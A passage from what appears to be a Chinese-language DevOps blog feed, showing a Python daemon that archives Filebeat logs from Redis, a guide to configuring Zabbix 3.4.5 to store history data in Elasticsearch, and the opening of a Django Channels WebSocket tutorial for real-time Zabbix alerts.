class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line"># @Author: Geekwolf</div><div class="line"># @Date:   2018-01-29 14:23:04</div><div class="line"># @Last Modified by:   Geekwolf</div><div class="line"># @Last Modified time: 2018-01-31 10:55:01</div><div class="line"></div><div class="line">#!/usr/bin/env python3</div><div class="line"># daemon.py</div><div class="line"></div><div class="line">import os</div><div class="line">import sys</div><div class="line">import time</div><div class="line">import redis</div><div class="line">import json</div><div class="line">import re</div><div class="line">import atexit</div><div class="line">import signal</div><div class="line"># import collections</div><div class="line"></div><div class="line"></div><div class="line">class Base(object):</div><div class="line"></div><div class="line">    def __init__(self, *args, **kwargs):</div><div class="line"></div><div class="line">        self.pidfile = &apos;/var/run/plogstash.pid&apos;</div><div class="line">        self.service_name = &apos;Plogstash&apos;</div><div class="line">        self.path = &apos;/var/log/plogstash&apos;</div><div class="line">        os.makedirs(self.path, exist_ok=True)</div><div class="line">        self.logfile = &apos;%s/%s.log&apos; % (self.path, self.service_name)</div><div class="line"></div><div class="line">        self.redis_host = &apos;127.0.0.1&apos;</div><div class="line">        self.redis_password = &apos;geekwolf&apos;</div><div class="line">        self.redis_port = 5044</div><div class="line">        self.redis_db = 0</div><div class="line">        self.redis_key = &apos;filebeat&apos;</div><div class="line">        self.batch_size = 5000</div><div class="line">        self.expires = 5  # second</div><div class="line">        self.archive_time = 1  # how long time to archive</div><div class="line">        self.base_dir = &apos;/data/logs&apos;</div><div class="line">        # self._tmp = &apos;/tmp/.%s&apos; % self.service_name</div><div class="line"></div><div class="line"></div><div class="line">class Daemon(Base):</div><div class="line"></div><div class="line">    def __init__(self, *args, **kwargs):</div><div class="line">        super(Daemon, self).__init__(*args, **kwargs)</div><div class="line"></div><div class="line">    def daemonize(self):</div><div class="line"></div><div class="line">        # First fork (detaches from parent)</div><div class="line">        try:</div><div class="line">            if os.fork() &gt; 0:</div><div class="line">                raise SystemExit(0)   # Parent exit</div><div class="line">        except OSError as e:</div><div class="line">            raise RuntimeError(&apos;fork #1 failed.&apos;)</div><div class="line"></div><div class="line">        os.chdir(&apos;/&apos;)</div><div class="line">        # set this will 777</div><div class="line">        # os.umask(0)</div><div class="line">        os.setsid()</div><div class="line">        # Second fork (relinquish session leadership)</div><div class="line">        try:</div><div class="line">            if os.fork() &gt; 0:</div><div class="line">                raise SystemExit(0)</div><div class="line">        except OSError as e:</div><div class="line">            raise RuntimeError(&apos;fork #2 failed.&apos;)</div><div class="line"></div><div class="line">        # Flush I/O buffers</div><div class="line">        sys.stdout.flush()</div><div class="line">        sys.stderr.flush()</div><div class="line"></div><div class="line">        # Replace file descriptors for stdin, stdout, and stderr</div><div class="line">        with open(self.logfile, &apos;ab&apos;, 0) as f:</div><div class="line">            os.dup2(f.fileno(), sys.stdout.fileno())</div><div class="line">        with open(self.logfile, &apos;ab&apos;, 0) as f:</div><div class="line">            os.dup2(f.fileno(), sys.stderr.fileno())</div><div class="line">        with open(self.logfile, &apos;rb&apos;, 0) as f:</div><div class="line">            os.dup2(f.fileno(), sys.stdin.fileno())</div><div class="line"></div><div class="line">        # Write the PID file</div><div class="line">        print(os.getpid())</div><div class="line">        with open(self.pidfile, &apos;w&apos;) as f:</div><div class="line">            print(os.getpid(), file=f)</div><div class="line"></div><div class="line">        # Arrange to have the PID file removed on exit/signal</div><div class="line">        atexit.register(lambda: os.remove(self.pidfile))</div><div class="line"></div><div class="line">        # Signal handler for termination (required)</div><div class="line">        def sigterm_handler(signo, frame):</div><div class="line">            raise SystemExit(1)</div><div class="line"></div><div class="line">        signal.signal(signal.SIGTERM, sigterm_handler)</div><div class="line"></div><div class="line">    def get_now_date(self):</div><div class="line"></div><div class="line">        return time.strftime(&apos;%Y-%m-%d&apos;, time.localtime(time.time()))</div><div class="line"></div><div class="line">    def get_now_timestamp(self):</div><div class="line"></div><div class="line">        return time.time()</div><div class="line"></div><div class="line">    def get_now_time(self):</div><div class="line">        return time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</div><div class="line"></div><div class="line">    def logging(self, msg):</div><div class="line"></div><div class="line">        with open(self.logfile) as f:</div><div class="line">            print(&apos;%s  %s&apos; % (self.get_now_time(), msg))</div><div class="line"></div><div class="line">    def append_log(self):</div><div class="line">        pass</div><div class="line"></div><div class="line">    def start(self):</div><div class="line"></div><div class="line">        if os.path.exists(self.pidfile):</div><div class="line">            raise RuntimeError(&apos;Already running&apos;)</div><div class="line">        else:</div><div class="line">            try:</div><div class="line">                self.daemonize()</div><div class="line">                self.append_log()</div><div class="line">                self.status()</div><div class="line">            except RuntimeError as e:</div><div class="line">                print(e, file=sys.stderr)</div><div class="line">                raise SystemExit(1)</div><div class="line"></div><div class="line">    def stop(self):</div><div class="line"></div><div class="line">        # f = os.open(self.pipe_path, os.O_RDONLY | os.O_NONBLOCK)</div><div class="line">        # ret = os.read(f, 1024).decode(&apos;utf-8&apos;)</div><div class="line">        # print(ret.split(&apos;\n&apos;))</div><div class="line">        # os.close(f)</div><div class="line"></div><div class="line">        if os.path.exists(self.pidfile):</div><div class="line">            # with open(self._tmp) as f:</div><div class="line">            #     _data = f.read()</div><div class="line">            #     if _data is not None and len(eval(_data)) &gt; 0:</div><div class="line">            #         for k, v in eval(_data).items():</div><div class="line">            #             v = v[&apos;fd&apos;].rstrip(&apos;\n&apos;)</div><div class="line">            #             v.close()</div><div class="line">            with open(self.pidfile) as f:</div><div class="line">                os.kill(int(f.read()), signal.SIGTERM)</div><div class="line">            print(&apos;Plogstash is stopped&apos;)</div><div class="line">        else:</div><div class="line">            print(&apos;Not running&apos;, file=sys.stderr)</div><div class="line">            raise SystemExit(1)</div><div class="line"></div><div class="line">    def restart(self):</div><div class="line"></div><div class="line">        self.stop()</div><div class="line">        self.start()</div><div class="line"></div><div class="line">    def status(self):</div><div class="line"></div><div class="line">        try:</div><div class="line">            with open(self.pidfile, &apos;r&apos;) as f:</div><div class="line">                pid = int(f.read().strip())</div><div class="line">        except:</div><div class="line">            pid = None</div><div class="line"></div><div class="line">        if pid:</div><div class="line">            print(&apos;%s is running as pid:%s&apos; % (self.service_name, pid))</div><div class="line">        else:</div><div class="line">            print(&apos;%s is not running&apos; % self.service_name)</div><div class="line"></div><div class="line"></div><div class="line">class Worker(Daemon):</div><div class="line"></div><div class="line">    def __init__(self, *args, **kwargs):</div><div class="line">        super(Worker, self).__init__(self, *args, **kwargs)</div><div class="line"></div><div class="line">    def _redis(self):</div><div class="line"></div><div class="line">        pool = redis.ConnectionPool(host=self.redis_host, password=self.redis_password, port=self.redis_port, db=self.redis_db, socket_timeout=10000)</div><div class="line">        rc = redis.StrictRedis(connection_pool=pool)</div><div class="line">        return rc</div><div class="line"></div><div class="line">    def get_redis_data(self):</div><div class="line"></div><div class="line">        _data = self._redis().lrange(self.redis_key, 0, self.batch_size - 1)</div><div class="line">        # 删除数据(可考虑处理完再删除)</div><div class="line">        return _data</div><div class="line"></div><div class="line">    def del_redis_data(self):</div><div class="line"></div><div class="line">        _data = self._redis().ltrim(self.redis_key, self.batch_size, -1)</div><div class="line"></div><div class="line">    def append_log(self):</div><div class="line"></div><div class="line">        file_meta = &#123;&#125;</div><div class="line">        # file_handler = collections.defaultdict(dict)</div><div class="line">        # try:</div><div class="line">        #     os.mkfifo(self.pipe_path)</div><div class="line">        # except Exception as e:</div><div class="line">        #     print(str(e))</div><div class="line"></div><div class="line">        # pipe_ins = os.open(self.pipe_path, os.O_SYNC | os.O_CREAT | os.O_RDWR)</div><div class="line">        while True:</div><div class="line">            time.sleep(self.archive_time)</div><div class="line">            _data = self.get_redis_data()</div><div class="line">            if _data:</div><div class="line">                for _d in _data:</div><div class="line">                    try:</div><div class="line">                        _d = json.loads(_d.decode(&apos;utf-8&apos;))</div><div class="line">                        _path = &apos;%s/%s/%s/%s&apos; % (self.base_dir, _d[&apos;fields&apos;][&apos;env&apos;], self.get_now_date(), _d[&apos;fields&apos;][&apos;ip_address&apos;])</div><div class="line">                        os.makedirs(_path + &apos;/logs&apos;, exist_ok=True)</div><div class="line">                        file_name = _d[&apos;source&apos;].split(&apos;/&apos;)[-1]</div><div class="line">                       # _path = &apos;%s/%s/%s/%s&apos; % (self.base_dir, _d[&apos;fields&apos;][&apos;env&apos;],self.get_now_date(), _d[&apos;fields&apos;][&apos;ip_address&apos;])</div><div class="line"></div><div class="line">                        if re.match(&apos;nohup&apos;, file_name):</div><div class="line">                            file_path = &apos;%s/%s&apos; % (_path, file_name)</div><div class="line">                        else:</div><div class="line">                            file_path = &apos;%s/logs/%s&apos; % (_path, file_name)</div><div class="line"></div><div class="line">                        with open(file_path, &apos;a&apos;) as f:</div><div class="line">                            f.write(_d[&apos;message&apos;] + &apos;\n&apos;)</div><div class="line">                        # if &apos;fd&apos; not in file_handler[file_path]:</div><div class="line">                        #     f = open(file_path, &apos;a&apos;, buffering=1024000)</div><div class="line">                        #     file_handler[file_path][&apos;fd&apos;] = str(f)</div><div class="line">                        # file_handler[file_path][&apos;time&apos;] = self.get_now_timestamp()</div><div class="line">                    except Exception as e:</div><div class="line">                        self.logging(str(e))</div><div class="line">                self.del_redis_data()</div><div class="line">            # with open(self._tmp, &apos;w&apos;) as f:</div><div class="line">            #     f.write(json.dumps(file_handler))</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">    if len(sys.argv) != 2:</div><div class="line">        print(&apos;Usage: &#123;&#125; [start|stop|restart|status]&apos;.format(sys.argv[0]), file=sys.stderr)</div><div class="line">        raise SystemExit(1)</div><div class="line"></div><div class="line">    daemon = Worker()</div><div class="line">    if sys.argv[1] == &apos;start&apos;:</div><div class="line">        daemon.start()</div><div class="line">    elif sys.argv[1] == &apos;stop&apos;:</div><div class="line">        daemon.stop()</div><div class="line">    elif sys.argv[1] == &apos;restart&apos;:</div><div class="line">        print(&quot;Restart ...&quot;)</div><div class="line">        daemon.restart()</div><div class="line">    elif sys.argv[1] == &apos;status&apos;:</div><div class="line">        daemon.status()</div><div class="line">    else:</div><div class="line">        print(&apos;Unknown command &#123;!r&#125;&apos;.format(sys.argv[1]), file=sys.stderr)</div><div class="line">        raise SystemExit(1)</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> Filebeat </tag>
            
            <tag> Logstash </tag>
            
            <tag> ELK </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Zabbix3.4.5新特性：历史数据支持Elasticsearch]]></title>
      <url>/2018/01/09/zabbix-es.html</url>
      <content type="html"><![CDATA[<h4 id="特性功能"><a href="#特性功能" class="headerlink" title="特性功能"></a>特性功能</h4><p>Zabbix自3.4.5rc1版本开始支持Elasticsearch作为历史数据存储，17年12月28日发布了3.4.5</p>
<h4 id="部署Elasticsearch"><a href="#部署Elasticsearch" class="headerlink" title="部署Elasticsearch"></a>部署Elasticsearch</h4><p>安装Elasticsearch和Kibana:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">echo &quot;deb http://http.debian.net/debian jessie-backports main&quot; &gt;&gt;/etc/apt/source.list</div><div class="line">echo &quot;deb https://artifacts.elastic.co/packages/6.x/apt stable main&quot; &gt; /etc/apt/sources.list.d/elastic-6.x.list</div><div class="line">wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -</div><div class="line"></div><div class="line">apt-get -y update</div><div class="line">apt-get install -t jessie-backports openjdk-8-jdk</div><div class="line">update-java-alternatives -s java-1.8.0-openjdk-amd64</div><div class="line"></div><div class="line">apt-get install -y elasticsearch kibana</div></pre></td></tr></table></figure></p>
<p>配置Elasticsearch和Kibana(两者在同一台机):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">vim /etc/elasticsearch/elasticsearch.yml</div><div class="line">network.host: 0.0.0.0</div><div class="line"></div><div class="line">vim  /etc/kibana/kibana.yml </div><div class="line">server.host: &quot;0.0.0.0&quot;</div><div class="line">elasticsearch.url: &quot;http://localhost:9200&quot;</div></pre></td></tr></table></figure>
<p>启动Elasticsearch和kibana服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/elasticsearch start</div><div class="line">/etc/init.d/kibana start</div></pre></td></tr></table></figure>
<h4 id="Zabbix3-4-0升级至3-4-5"><a href="#Zabbix3-4-0升级至3-4-5" class="headerlink" title="Zabbix3.4.0升级至3.4.5"></a>Zabbix3.4.0升级至3.4.5</h4><p><strong>注:</strong> 由于Zabbix3.4.5对libcurl库要求在7.20.0或者更高，Debian 8下面默认是7.38.0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/zabbix_server stop</div><div class="line">tar xf zabbix-3.4.5.tar.gz</div><div class="line">cd zabbix-3.4.5</div><div class="line">./configure --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2</div><div class="line">make -j8</div><div class="line">make install</div></pre></td></tr></table></figure>
<h4 id="Zabbix-server配置支持Elasticsearch"><a href="#Zabbix-server配置支持Elasticsearch" class="headerlink" title="Zabbix_server配置支持Elasticsearch"></a>Zabbix_server配置支持Elasticsearch</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim /usr/local/etc/zabbix_server.conf</div><div class="line">HistoryStorageURL=http://192.168.100.100:9200</div><div class="line">HistoryStorageTypes=uint,dbl,str,log,text</div></pre></td></tr></table></figure>
<p><strong>说明:</strong></p>
<p>Elasticsearch支持的监控项类型:uint,dbl,str,log,text<br>监控项数据类型|数据库表|对应Elasticsearch类型:<br><img src="http://ow1schdt5.bkt.clouddn.com/zabbix-es-type.png" alt="image"></p>
<h4 id="Zabbix-Web配置历史数据读Elasticsearch"><a href="#Zabbix-Web配置历史数据读Elasticsearch" class="headerlink" title="Zabbix Web配置历史数据读Elasticsearch"></a>Zabbix Web配置历史数据读Elasticsearch</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">修改配置文件vim conf/zabbix.conf.php</div><div class="line">1. 如果不同类型使用不同的ES集群，可以按如下进行配置</div><div class="line">$HISTORY[&apos;url&apos;]   = [</div><div class="line">    &apos;uint&apos; =&gt; &apos;http://localhost1:9200&apos;,</div><div class="line">    &apos;text&apos; =&gt; &apos;http://localhost2:9200&apos;</div><div class="line">];</div><div class="line">$HISTORY[&apos;types&apos;] = [&apos;uint&apos;, &apos;text&apos;];</div><div class="line"></div><div class="line">2. 所有类型使用相同ES集群</div><div class="line">$HISTORY[&apos;url&apos;]   = &apos;http://192.168.100.100:9200&apos;;</div><div class="line">$HISTORY[&apos;types&apos;] = [&apos;str&apos;, &apos;text&apos;, &apos;log&apos;, &apos;uint&apos;, &apos;dbl&apos;];</div></pre></td></tr></table></figure>
<p><strong>注:</strong> 3.4.0升级到3.4.5后，请勿使用旧的zabbix.conf.php，根据新的zabbix.conf.php.example重新配置</p>
<h4 id="重启Zabbix-Server"><a href="#重启Zabbix-Server" class="headerlink" title="重启Zabbix Server"></a>重启Zabbix Server</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/zabbix_server start</div><div class="line">此时可以通过观察日志，查看是否连接ES成功</div></pre></td></tr></table></figure>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><ol>
<li><p>Zabbix配置ES成功后,通过Kibana可以看到：<br><img src="http://ow1schdt5.bkt.clouddn.com/zabbix_es1.png" alt="image"></p>
</li>
<li><p>创建索引<br><img src="http://ow1schdt5.bkt.clouddn.com/zabbix_es2.png" alt="image"><br><img src="http://ow1schdt5.bkt.clouddn.com/zabbix_es3.png" alt="image"><br><img src="http://ow1schdt5.bkt.clouddn.com/zabbix_es4.png" alt="image"></p>
</li>
<li><p>通过Zabbix Web访问是否正常显示数据</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Django Channels实现Zabbix实时告警到页面]]></title>
      <url>/2018/01/09/devops-django-channels.html</url>
      <content type="html"><![CDATA[<h4 id="什么是WebSocket"><a href="#什么是WebSocket" class="headerlink" title="什么是WebSocket"></a>什么是WebSocket</h4><p>websocket是HTML5开始提供的一种新协议,用于浏览器和服务器之间实现全双工通讯的技术。本质上是基于tcp协议,先通过HTTP/HTTPS协议发起一条特殊的http请求进行握手后,创建一个用于双向数据交换的tcp连接,此后服务端与客户端通过此连接进行实时通信。在websocket之前实现全双工通讯一般使用轮训、SSE(Server-Sent Event,服务端推送事件)、Comet技术</p>
<h4 id="HTTP与WebSocket的区别"><a href="#HTTP与WebSocket的区别" class="headerlink" title="HTTP与WebSocket的区别"></a>HTTP与WebSocket的区别</h4><p><img src="http://i.imgur.com/9oXAC24.png" alt="image"></p>
<ul>
<li>由上面的示意图可知,在传统的http1.0,request和response是一对一的，每次都要发送header信息</li>
<li>http1.1 默认开启了keeplive也只是复用同一个tcp连接，但是服务器和客户端还要大量交换HTTP header，信息交换效率很低。</li>
<li>WebSocket是一种双向通信协议。在建立连接后，WebSocket服务器端和客户端都能主动向对方发送或接收数据，就像Socket一样。从而更好的节省服务器资源和带宽并达到实时通讯的目的</li>
<li>WebSocket需要像TCP一样，先建立连接，连接成功后才能相互通信</li>
</ul>
<h4 id="客户端通过WebSocket与服务端建立通信过程"><a href="#客户端通过WebSocket与服务端建立通信过程" class="headerlink" title="客户端通过WebSocket与服务端建立通信过程"></a>客户端通过WebSocket与服务端建立通信过程</h4><ol>
<li><p>在客户端，new WebSocket实例化一个新的WebSocket客户端对象，请求类似 ws://yourdomain:port/path 的服务端WebSocket URL，客户端WebSocket对象会自动解析并识别为WebSocket请求，并连接服务端端口，执行双方握手过程，客户端发送数据格式类似：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /ws/alert/ HTTP/1.1</div><div class="line">Host: 127.0.0.1:8000</div><div class="line">Upgrade: websocket</div><div class="line">Connection: Upgrade</div><div class="line">Sec-WebSocket-Key: xqBt3ImNzJbYqRINxEFlkg==</div><div class="line">Origin: http://127.0.0.1:8000</div><div class="line">Sec-WebSocket-Version: 13</div></pre></td></tr></table></figure>
</li>
<li><p>可以看到，客户端发起的WebSocket连接报文类似传统HTTP报文，Upgrade：websocket参数值表明这是WebSocket类型请求，Sec-WebSocket-Key是WebSocket客户端发送的一个 base64编码的密文，要求服务端必须返回一个对应加密的Sec-WebSocket-Accept应答，否则客户端会抛出Error during WebSocket handshake错误，并关闭连接。服务端收到报文后返回的数据格式类似：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 101 Switching Protocols</div><div class="line">Upgrade: websocket</div><div class="line">Connection: Upgrade</div><div class="line">Sec-WebSocket-Accept: K7DJLdLooIwIG/MOpvWFB3y3FE8=</div></pre></td></tr></table></figure>
</li>
</ol>
<p>Sec-WebSocket-Accept的值是服务端采用与客户端一致的密钥计算出来后返回客户端的，HTTP/1.1 101 Switching Protocols表示服务端接受WebSocket协议的客户端连接，经过这样的请求-响应处理后，两端的WebSocket连接握手成功, 后续就可以进行TCP通讯了</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2017/bg2017051503.jpg" alt="image"></p>
<p><code>注释:</code> WebSocket标识符是ws(如果加密,则是wss),如上图所示</p>
<h4 id="WebSocket服务"><a href="#WebSocket服务" class="headerlink" title="WebSocket服务"></a>WebSocket服务</h4><ul>
<li>Node(按热度排序): <a href="https://socket.io/" target="_blank" rel="external">Socket.IO</a>、<a href="https://github.com/uNetworking/uWebSockets" target="_blank" rel="external">uWebSockets</a>、<a href="https://github.com/theturtle32/WebSocket-Node" target="_blank" rel="external">WebSocket-Node</a></li>
<li>Go: <a href="https://github.com/joewalnes/websocketd" target="_blank" rel="external">websocketd</a>、<a href="https://github.com/gorilla/websocket" target="_blank" rel="external">websocket</a></li>
<li>Django: <a href="https://github.com/django/channels/" target="_blank" rel="external">Channel</a></li>
</ul>
<h4 id="Django-Channel"><a href="#Django-Channel" class="headerlink" title="Django Channel"></a>Django Channel</h4><h5 id="WSGI-ASGI"><a href="#WSGI-ASGI" class="headerlink" title="WSGI/ASGI"></a>WSGI/ASGI</h5><p><strong>WSGI</strong><br>大家都知道WSGI,即Web Server Gateway Interface,是服务器和客户端交互的接口规范，符合这种借口的application可以在所有符合该接口的server上运行，解耦了server和application;web组件被分成三类：client、server、middleware</p>
<p><img src="http://7xp2eu.com1.z0.glb.clouddn.com/wsgiframework.png" alt="image"><br><img src="http://7xp2eu.com1.z0.glb.clouddn.com/wsgiframeworkmiddleware.png" alt="image"></p>
<p>如上图所示</p>
<ul>
<li>Server/Gateway：处理HTTP协议，接受用户HTTP请求，调用application处理逻辑，将response返回给client;比如Apache、Nginx</li>
<li>Application：专注业务逻辑的python 应用或者框架，如Django；根据WSGI协议规范，Applicaiton需要定义<a href="http://wsgi.tutorial.codepoint.net/application-interface" target="_blank" rel="external">http://wsgi.tutorial.codepoint.net/application-interface</a></li>
<li>Middleware：位于Server/Gateway 和 Application/Framework 之间，对 Server/Gateway 来说，它相当于 Application/Framework ；对 Application/Framework  来说，它相当于 Server/Gateway。每个 middleware 实现不同的功能，我们通常根据需求选择相应的 middleware 并组合起来，实现所需的功能。比如，可在 middleware 中实现以下功能：<ol>
<li>根据 url 把用户请求调度到不同的 application 中</li>
<li>负载均衡，转发用户请求</li>
<li>限制请求速率，设置白名单<br>WSGI的middleware体现 unix 的哲学之一：do one thing and do it well</li>
</ol>
</li>
</ul>
<p><strong>ASGI</strong><br>由于WSGI协议支持HTTP,ASGI(Asynchronous Server Gateway Interface)在此基础上应运而生，对WSGI协议进行兼容和扩展，能够处理多种通用协议如HTTP、HTTP2、WebSocket，允许这些协议能通过网络或本地socket进行传输，以及让不同的协议被分配到不同的进程中<br><img src="http://ow1schdt5.bkt.clouddn.com/django-wsgi.png" alt="image"><br><img src="http://ow1schdt5.bkt.clouddn.com/asgi.jpg" alt="image"></p>
<p>ASGI由三个不同的组件组成:协议服务、频道层(Channnel Layer)、应用层；其中Channel Layer是最重要的部分，同时对协议服务和应用提供接口；</p>
<ul>
<li>频道和消息： ASGI规定所有通信都要通过在频道里发送消息进行，消息是一个dict,为了保证可序列化，只允许以下类型数据<br>  string/Unicode/int(非long)/list/dict(Key是Unicode)/boolean/None<br>  频道是一个先进先出队列，队列中的消息最多发送给一个消费者；频道中的消息超过设定时间会被清理，消息大小最大限定为1MB，超过需要分块</li>
<li>群组: 频道中消息只能被传送一次，不能广播；如果向任一组用户发送消息，就要用到群组</li>
</ul>
<h5 id="Channels"><a href="#Channels" class="headerlink" title="Channels"></a>Channels</h5><p>大概了解ASGI规范之后，看下django基于ASGI协议实现HTTP/HTTP2/WebSocket的模块Channels,安装好channels后，django将有原来的request-response模式，转换成worker工作模式；并没有运行单独的wsgi进程，而是分成了三层:</p>
<ul>
<li>interface Server: 负责Django和Client通信，同时适配WSGI和WebSocket Server</li>
<li>Channel Layer: 可插拔的Python代码和数据存储，如Redis、或者内存，用于消息的传输</li>
<li>Workers: 监听频道，消息抵达时运行消费者代码</li>
</ul>
<p>下面用例子来看下如何使用Channels: 实现Zabbix报警实时传送到客户端<br>描述:<br><img src="http://ow1schdt5.bkt.clouddn.com/zabbix-alert.png" alt="image"></p>
<ul>
<li>Trigger触发时，根据Action设置通过脚本报警，并将报警信息发布到Redis的ALARM频道</li>
<li>Django Commands alert  订阅Redis的ALARM频道</li>
<li>调用channels的send方法，通过websocket实时推送到Client</li>
</ul>
<p>目录结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">monitor</div><div class="line">├── monitor</div><div class="line">│   ├── celery.py</div><div class="line">│   ├── consumers.py</div><div class="line">│   ├── __init__.py</div><div class="line">│   ├── routing.py</div><div class="line">│   ├── settings.py</div><div class="line">│   ├── urls.py</div><div class="line">│   └── wsgi.py</div><div class="line">├── commands</div><div class="line">│   ├── admin.py</div><div class="line">│   ├── apps.py</div><div class="line">│   ├── __init__.py</div><div class="line">│   ├── management</div><div class="line">│   │   ├── commands</div><div class="line">│   │   │   ├── alert.py</div><div class="line">│   │   │   ├── __init__.py</div><div class="line">│   │   │   └── __pycache__</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   └── __pycache__</div><div class="line">│   ├── migrations</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   └── __pycache__</div><div class="line">│   ├── models.py</div><div class="line">│   ├── __pycache__</div><div class="line">│   ├── tests.py</div><div class="line">│   └── views.py</div><div class="line">├── static</div><div class="line">├── templates</div><div class="line">│   ├── base</div><div class="line">|        |—— base.html</div><div class="line">├── README.md</div><div class="line">├── requirements.txt</div></pre></td></tr></table></figure></p>
<h6 id="安装配置Channels"><a href="#安装配置Channels" class="headerlink" title="安装配置Channels"></a>安装配置Channels</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div 